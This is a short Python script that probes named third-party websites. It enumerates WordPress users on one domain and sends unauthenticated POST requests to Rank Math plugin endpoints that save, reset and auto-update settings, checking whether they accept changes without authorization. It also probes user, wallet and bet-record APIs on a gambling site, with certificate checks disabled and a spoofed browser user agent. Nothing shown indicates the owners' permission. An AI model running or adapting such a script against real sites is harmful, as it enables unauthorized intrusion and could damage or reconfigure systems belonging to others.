import urllib.request, urllib.error, json, ssl

ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"}
def req(base, path, headers=None, data=None, method=None, ct="application/x-www-form-urlencoded"):
    h=dict(UA)
    if headers: h.update(headers)
    body=None
    if data is not None:
        body=(json.dumps(data).encode() if ct=="json" else (data.encode() if isinstance(data,str) else data))
        h["Content-Type"]=ct
    req_=urllib.request.Request(base+path, data=body, headers=h, method=method)
    try:
        r=urllib.request.urlopen(req_, timeout=20, context=ctx)
        return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return None, {"err":str(e)}, str(e).encode()

W="https://ofa377.com.tw"
print("=== WP user enumeration ===")
for p in ["/wp-json/wp/v2/users","/wp-json/wp/v2/users/me","/wp-json/wp/v2/users?per_page=1"]:
    s,h,b=req(W,p)
    print(p,"->",s, b[:200].decode(errors="ignore"))

print("\n=== Rank Math REST auth test ===")
for p,method,d in [
    ("/wp-json/rankmath/v1/saveModule","POST",{"module":"general","state":"on"}),
    ("/wp-json/rankmath/v1/updateSettings","POST",{"settings":{}}),
    ("/wp-json/rankmath/v1/resetSettings","POST",None),
    ("/wp-json/rankmath/v1/toolsAction","POST",{"action":"clearCache"}),
    ("/wp-json/rankmath/v1/autoUpdate","POST",{"state":"on"}),
]:
    s,h,b=req(W,p,method=method,data=d,ct="json")
    print(f"{method} {p} -> {s} :: {b[:220].decode(errors='ignore')}")

print("\n=== ofa377.net gambling API probes ===")
G="https://ofa377.net"
for p in ["/api/v1/login","/api/v2/register/","/api/v1/user/wallet","/api/v1/user","/api/v1/user/record/bet","/api/v1/user/wallet/exchangerate"]:
    s,h,b=req(G,p)
    print(f"GET {p} -> {s} :: {b[:200].decode(errors='ignore')}")
